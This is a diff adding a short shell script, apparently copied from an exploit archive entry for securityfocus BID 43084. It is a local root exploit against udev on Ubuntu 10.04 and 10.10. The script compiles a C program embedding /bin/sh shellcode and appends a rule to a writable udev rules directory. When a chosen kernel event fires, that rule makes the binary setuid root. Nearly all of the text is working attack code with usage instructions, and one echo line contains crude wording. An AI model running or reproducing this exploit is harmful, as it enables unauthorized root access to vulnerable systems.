@@ -1,0 +1,26 @@
+Source: http://www.securityfocus.com/bid/43084/info
+
+#!/bin/sh
+# by fuzz. For Anux inc. #
+# ubuntu 10.04 , 10.10
+if [ -z "$1" ]
+then
+        echo "usage: $0 <UDEV KERNEL EVENT>"
+        echo "see here http://www.reactivated.net/writing_udev_rules.html"
+        exit
+fi
+cat > usn985-exploit.sh << EOF
+#!/bin/sh
+chown root:root $PWD/usn985-sc
+chmod +s $PWD/usn985-sc
+EOF
+cat > usn985-sc.c << EOF
+char *s="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68"
+"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+main(){int *r;*((int *)&r+2)=(int)s;}
+EOF
+gcc usn985-sc.c -o usn985-sc
+echo "KERNEL==\"$1\", RUN+=\"$PWD/usn985-exploit.sh\"" >> /dev/.udev/rules.d/root.rules
+chmod +x usn985-exploit.sh
+echo "All set, now wait for udev to restart (reinstall, udev upgrade, SE, raep, threat.)"
+echo "Once the conf is reloaded, just make the udev event happen : usn985-sc file will get suid-root"
